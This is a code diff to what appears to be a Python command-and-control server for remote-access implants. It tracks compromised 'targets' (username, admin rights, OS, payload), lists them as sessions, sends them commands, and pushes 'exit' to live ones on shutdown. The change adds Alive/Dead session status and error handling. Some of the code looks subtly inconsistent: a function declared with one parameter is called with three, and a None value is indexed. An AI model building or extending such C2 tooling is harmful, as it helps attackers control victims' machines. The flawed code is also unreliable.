@@ -132,6 +132,7 @@ def target_comm(targ_id):
         if message == "exit":
             targ_id.send(message.encode())
             targ_id.close()
+            targets[num][7] = "Dead"
             break
 
         if message == "background":
@@ -203,10 +204,10 @@ def comm_handler():
             host_name = socket.gethostbyaddr(remote_ip[0])
             
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val, "Alive"])
             
             else:
-                targets.append([remote_target, remote_ip[0], time_record])
+                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, op_sys, pay_val, "Alive"])
                 print(f"\n[+] Connection received from {host_name[0]}{remote_ip[0]}\n" + "@> ", end="")
         
         except:
@@ -261,21 +262,45 @@ if __name__ == "__main__":
                     myTable.field_names = ["Session", "Status", "Username", "Admin", "Target", "Operating System", "Contact Time"]
                     myTable.padding_width = 3
                     for target in targets:
-                        myTable.add_row([session_counter, "Placeholder", target[3], target[4], target[1], target[5], target[2]])
+                        myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
                         session_counter += 1
                     print(myTable)
 
                 if command.split(" ")[1] == "-i":
-                    num = int(command.split(" ")[2])
-                    targ_id = (targets[num])[0]
-                    target_comm(targ_id, targets, num)
+                    try:
+                        num = int(command.split(" ")[2])
+                        targ_id = (targets[num])[0]
+
+                        if (targets[num])[7] == "Alive":
+                            target_comm(targ_id, targets, num)
+
+                        else:
+                            print("[-] Target session is dead.")
+                    
+                    except IndexError:
+                        print(f"[-] Remote session {num} does not exist.")
         
         except IndexError:
             print("[-] Command requires argument(s).")
             continue
         
         except KeyboardInterrupt:
-            print("\n[+] Keyboard interrupt issued.")
-            kill_flag = 1
-            sock.close()
-            break
+            quit_message = input("Ctrl-C\n[!] Quit? (y/n)").lower()
+            
+            if quit_message == "y":
+                print("\n[+] Keyboard interrupt issued.")
+                tar_length = len(targets)
+
+                for target in targets:
+                    if target[7] == "Dead":
+                        pass
+
+                    else:
+                        comm_out(target[0], "exit")
+
+                kill_flag = 1
+                sock.close()
+                break
+
+            else:
+                continue
